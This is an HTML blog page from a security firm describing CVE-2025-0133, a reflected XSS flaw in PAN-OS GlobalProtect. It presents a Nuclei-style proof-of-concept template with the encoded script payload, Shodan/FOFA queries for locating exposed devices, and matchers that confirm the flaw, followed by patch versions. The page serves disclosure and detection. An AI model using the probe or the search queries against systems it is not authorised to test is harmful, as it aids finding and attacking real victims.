@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2025-0133 – Palo Alto PAN-OS Reflected XSS Vulnerability | Zerosek</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <!-- <link rel="stylesheet" href="../assets/styles.css"> -->
+    <link rel="icon" href="../assets/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="blogcommon.css">
+    <style>
+        :root {
+            --primary: #ff6b6b;
+            --secondary: #4a6bff;
+            --dark: #0f172a;
+            --darker: #020617;
+            --light: #f8fafc;
+            --accent: #00e0c7;
+            --warning: #f59e0b;
+            --code-bg: #1e293b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--darker), var(--dark));
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        .container {
+            /* max-width: 900px; */
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .blog-container {
+            max-width: 1050px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* header {
+            margin-bottom: 3rem;
+            position: relative;
+            overflow: hidden;
+            padding: 2rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        } */
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 107, 107, 0.1) 0%, rgba(2, 6, 23, 0) 70%);
+            animation: pulse 15s infinite alternate;
+            z-index: -1;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: translate(0, 0);
+            }
+
+            50% {
+                transform: translate(25%, 25%);
+            }
+
+            100% {
+                transform: translate(-25%, -25%);
+            }
+        }
+
+        .cve-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .cve-id {
+            background: linear-gradient(to right, var(--primary), var(--warning));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 2rem;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+
+        .cve-date {
+            color: var(--accent);
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            color: var(--light);
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--accent);
+            position: relative;
+            display: inline-block;
+            padding-bottom: 5px;
+        }
+
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 50%;
+            height: 3px;
+            background: linear-gradient(to right, var(--primary), transparent);
+            border-radius: 3px;
+        }
+
+        h3 {
+            font-size: 1.2rem;
+            margin: 1.5rem 0 0.5rem;
+            color: var(--warning);
+        }
+
+        p {
+            opacity: 0.9;
+            margin-bottom: 1.5rem;
+        }
+
+        .intro {
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            padding: 1.5rem;
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 3px solid var(--primary);
+            border-radius: 0 5px 5px 0;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .severity-badge {
+            display: inline-block;
+            background: linear-gradient(45deg, var(--primary), var(--warning));
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 1rem;
+            vertical-align: middle;
+        }
+
+        .content-section {
+            margin-bottom: 3rem;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .code-block {
+            background: var(--code-bg);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            border-left: 3px solid var(--secondary);
+            position: relative;
+        }
+
+        .code-block::before {
+            content: 'Proof of Concept';
+            position: absolute;
+            top: 0;
+            left: 0;
+            background: var(--secondary);
+            color: white;
+            padding: 0.2rem 0.8rem;
+            border-radius: 0 0 5px 0;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        .vulnerable-instance {
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border-left: 3px solid var(--primary);
+            animation: pulseBorder 2s infinite alternate;
+        }
+
+        @keyframes pulseBorder {
+            0% {
+                border-left-color: var(--primary);
+            }
+
+            100% {
+                border-left-color: var(--warning);
+            }
+        }
+
+        .remediation-list {
+            list-style-type: none;
+            margin: 1.5rem 0;
+        }
+
+        .remediation-list li {
+            padding: 0.5rem 0;
+            position: relative;
+            padding-left: 2rem;
+        }
+
+        .remediation-list li::before {
+            content: '🛡️';
+            position: absolute;
+            left: 0;
+        }
+
+        .reference-list {
+            list-style-type: none;
+            margin: 1.5rem 0;
+        }
+
+        .reference-list li {
+            padding: 0.5rem 0;
+            position: relative;
+            padding-left: 2rem;
+        }
+
+        .reference-list li::before {
+            content: '🔗';
+            position: absolute;
+            left: 0;
+            color: var(--accent);
+        }
+
+        .reference-list a {
+            color: var(--accent);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--accent);
+            transition: all 0.3s ease;
+        }
+
+        .reference-list a:hover {
+            color: var(--secondary);
+            border-bottom-color: var(--secondary);
+        }
+
+        .closing-words {
+            background: rgba(0, 224, 199, 0.1);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-left: 3px solid var(--accent);
+        }
+
+        .social-links {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .blog-social-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--light);
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .blog-social-link.linkedin {
+            background: rgba(10, 102, 194, 0.2);
+            border: 1px solid rgba(10, 102, 194, 0.3);
+        }
+
+        .blog-social-link.github {
+            background: rgba(110, 84, 148, 0.2);
+            border: 1px solid rgba(110, 84, 148, 0.3);
+        }
+
+        .blog-social-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .floating-shapes {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .shape {
+            position: absolute;
+            opacity: 0.1;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            filter: blur(40px);
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+
+            50% {
+                transform: translate(50px, 100px) rotate(180deg);
+            }
+
+            100% {
+                transform: translate(0, 0) rotate(360deg);
+            }
+        }
+
+        /* footer {
+            text-align: center;
+            margin-top: 4rem;
+            padding: 2rem 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        } */
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+
+            .cve-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            .code-block {
+                padding: 1rem 0.5rem;
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header>
+        <div class="nav-container">
+            <nav>
+                <div class="logo">
+                    <img src="../assets/zeroseklogo.png" alt="Zeroseksolutions Logo" id="logo-img">
+                    <span class="logo-text">Solutions</span>
+                </div>
+                <ul class="nav-links" id="navLinks">
+                    <li class="li-link"><a href="../index.html">Home</a></li>
+                    <li class="li-link"><a href="../about/index.html">About Us</a></li>
+                    <li class="li-link"><a href="../index.html#services">Services</a></li>
+                    <li class="li-link"><a href="../index.html#products">Products</a></li>
+                    <li class="li-link"><a href="./blogs.html">Blog</a></li>
+                    <li class="li-link"><a href="../index.html#contact">Contact</a></li>
+                    <li class="li-link"><a href="../career/career.html">Career</a>
+                </ul>
+                <button class="mobile-menu-btn" id="mobileMenuBtn">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </nav>
+        </div>
+    </header>
+
+
+    <div class="floating-shapes" id="shapes-container"></div>
+
+    <div class="blog-container">
+        <div>
+            <div class="cve-header">
+                <span class="cve-id">CVE-2025-0133</span>
+                <span class="cve-date">Published: January 15, 2025</span>
+            </div>
+            <h1>Palo Alto PAN-OS Reflected XSS Vulnerability <span class="severity-badge">HIGH SEVERITY</span></h1>
+        </div>
+
+        <section class="content-section">
+            <div class="intro">
+                A reflected cross-site scripting (XSS) vulnerability in the GlobalProtect™ gateway and portal features
+                of Palo Alto Networks PAN-OS® software enables execution of malicious JavaScript in the context of an
+                authenticated Captive Portal user's browser when they click on a specially crafted link. The primary
+                risk is phishing attacks that can lead to credential theft—particularly if you enabled Clientless VPN.
+            </div>
+
+            <h2>Proof of Concept</h2>
+            <p>The vulnerability resides in a parameter exposed by the GlobalProtect or WebGUI endpoint, where user
+                input was not adequately sanitized before being reflected in the HTML response.</p>
+
+            <h3>Step 1: Trigger the XSS Payload</h3>
+            <p>A malicious actor can trigger the reflected XSS by crafting the following HTTP request:</p>
+
+            <div class="code-block">
+                <pre><code class="language-yaml">id: CVE-2025-0133
+info:
+  name: PAN-OS - Reflected Cross-Site Scripting  
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query:
+      - http.favicon.hash:"-631559155"
+      - cpe:"cpe:2.3:o:paloaltonetworks:pan-os"
+    fofa-query: icon_hash="-631559155"
+    product: pan-os
+    vendor: paloaltonetworks
+
+http:
+  - raw:
+      - |
+        GET /ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1%2Cmd5&enc-algo=aes-128-cbc%2Caes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E&domain=%28empty_domain%29&computer=computer HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '&lt;script&gt;prompt("XSS")&lt;/script&gt;'
+          - 'authentication cookie'
+        condition: and
+
+      - type: status
+        status:
+          - 200</code></pre>
+            </div>
+
+            <h3>Step 2: Confirm the Reflection</h3>
+            <p>If the payload appears in the response body unencoded, this confirms the target is vulnerable. The
+                request does not require authentication, which makes it more impactful on publicly exposed interfaces.
+            </p>
+        </section>
+
+        <section class="content-section">
+            <h2>Vulnerable Instance</h2>
+            <div class="vulnerable-instance">
+                <p>When the PAN-OS instance is vulnerable, the script will execute in the victim's browser, potentially
+                    stealing session tokens or executing administrative actions.</p>
+            </div>
+        </section>
+
+        <section class="content-section">
+            <h2>Remediation</h2>
+            <p>Palo Alto has released patches and hotfixes addressing this vulnerability across PAN-OS versions:</p>
+            <ul class="remediation-list">
+                <li>PAN-OS 11.0.4 and later</li>
+                <li>PAN-OS 10.2.6 and later</li>
+                <li>PAN-OS 10.1.11 and later</li>
+            </ul>
+            <p>All users are advised to upgrade to the latest available version and ensure the web interface is not
+                exposed directly to the internet.</p>
+            <p>Patch guidance and advisory: <a href="https://security.paloaltonetworks.com/CVE-2025-0133"
+                    target="_blank"
+                    style="color: var(--accent); text-decoration: none; border-bottom: 1px dashed var(--accent);">https://security.paloaltonetworks.com/CVE-2025-0133</a>
+            </p>
+        </section>
+
+        <section class="content-section">
+            <h2>References</h2>
+            <ul class="reference-list">
+                <li><a href="https://security.paloaltonetworks.com/CVE-2025-0133" target="_blank">Palo Alto Networks
+                        Security Advisory</a></li>
+                <li><a href="https://hackerone.com/reports/3096384" target="_blank">HackerOne Report #3096384</a></li>
+            </ul>
+        </section>
+
+        <section class="content-section">
+            <div class="closing-words">
+                <h2>Closing Words</h2>
+                <p>Our team at Zerosek continues to monitor emerging threats and respond with detection tools,
+                    coordinated disclosures, and remediation guidance. As part of our commitment to securing the
+                    external attack surface, we rapidly track CVEs like CVE-2025-0133 and provide clients with immediate
+                    actionable insights.</p>
+                <p>Stay updated with more vulnerabilities and tool releases by following our:</p>
+                <div class="social-links">
+                    <a href="https://www.linkedin.com/company/zerosek/" class="blog-social-link linkedin">
+                        <i class="fab fa-linkedin"></i> LinkedIn
+                    </a>
+                    <a href="#" class="blog-social-link github">
+                        <i class="fab fa-github"></i> GitHub
+                    </a>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-about">
+                    <div class="footer-logo">
+                        <img src="../assets/zeroseklogo.png" alt="Ashtrasolutions Logo" loading="lazy">
+                    </div>
+                    <p>Providing cutting-edge security solutions and web development services to help businesses thrive
+                        in the digital landscape.</p>
+                    <div class="social-links">
+                        <a href="https://www.facebook.com/profile.php?id=61578268196863" target="_blank"
+                            class="social-link"><i class="fab fa-facebook-f"></i></a>
+                        <a href="https://x.com/zeroseksolution" target="_blank" class="social-link"><i
+                                class="fab fa-twitter"></i></a>
+                        <a href="https://www.linkedin.com/in/zerosek-solutions-llp-55b2aa374/" target="_blank"
+                            class="social-link"><i class="fab fa-linkedin-in"></i></a>
+                        <a href="https://www.instagram.com/zeroseksolutions/" target="_blank" class="social-link"><i
+                                class="fab fa-instagram"></i></a>
+                    </div>
+                </div>
+                <div class="footer-links">
+                    <h3>Quick Links</h3>
+                    <ul>
+                        <li><a href="../index.html">Home</a></li>
+                        <li><a href="../index.html#services">Services</a></li>
+                        <li><a href="../index.html#products">Products</a></li>
+                        <li><a href="../about/index.html">About Us</a></li>
+                        <li><a href="../index.html#blog">Blog</a></li>
+                        <!-- <li><a href="#book-meeting">Book a Meeting</a></li> -->
+                        <li><a href="../index.html#contact">Contact Us</a></li>
+                    </ul>
+                </div>
+                <div class="footer-contact">
+                    <h3>Contact Us</h3>
+                    <p><i class="fas fa-map-marker-alt"></i> <a class="footer-contactus-links"
+                            href="https://www.google.com/maps/place/%E0%A4%B0%E0%A5%81%E0%A4%A6%E0%A5%8D%E0%A4%B0+%E0%A4%AB%E0%A5%8D%E0%A4%B2%E0%A5%88%E0%A4%9F/@25.369287,83.023739,348m/data=!3m1!1e3!4m6!3m5!1s0x398e2eefbc0c0719:0x6e1eda5f5d2db608!8m2!3d25.3692869!4d83.023739!16s%2Fg%2F11d_ymjwr6?hl=hi&entry=ttu&g_ep=EgoyMDI1MDYyMy4yIKXMDSoASAFQAw%3D%3D">Sarnath,
+                            Varanasi, Uttar Pradesh India 221007</a></p>
+                    <p><i class="fas fa-phone-alt"></i>
+                        <a class="footer-contactus-links" href="tel:+916387705669">+916387705669</a>
+                        <a class="footer-contactus-links" href="tel:+919838587277">+919838587277</a>
+                    </p>
+                    <p><i class="fas fa-envelope"></i> <a class="footer-contactus-links"
+                            href="mailto:contact@zerosek.com">contact@zerosek.com</a></p>
+                    <p><i class="fas fa-clock"></i> Mon-Sat: 9:00 AM - 10:00 PM</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 ZeroSek Solutions. All Rights Reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- <footer>
+        <p>&copy; 2025 Zerosek solutions. All rights reserved.</p>
+    </footer> -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>
+        // Create floating shapes
+        document.addEventListener('DOMContentLoaded', function () {
+            const shapesContainer = document.getElementById('shapes-container');
+            const colors = ['#ff6b6b', '#4a6bff', '#00e0c7'];
+
+            for (let i = 0; i < 8; i++) {
+                const shape = document.createElement('div');
+                shape.classList.add('shape');
+
+                // Random size between 100 and 300px
+                const size = Math.random() * 200 + 100;
+                shape.style.width = `${size}px`;
+                shape.style.height = `${size}px`;
+
+                // Random position
+                shape.style.left = `${Math.random() * 100}%`;
+                shape.style.top = `${Math.random() * 100}%`;
+
+                // Random animation duration and delay
+                shape.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                shape.style.animationDelay = `${Math.random() * 5}s`;
+
+                // Random color
+                shape.style.background = `linear-gradient(45deg, ${colors[Math.floor(Math.random() * colors.length)]}, ${colors[Math.floor(Math.random() * colors.length)]})`;
+
+                shapesContainer.appendChild(shape);
+            }
+
+            // Initialize syntax highlighting hljs.highlightAll();
+
+        });
+    </script>
+</body>
+
+</html>
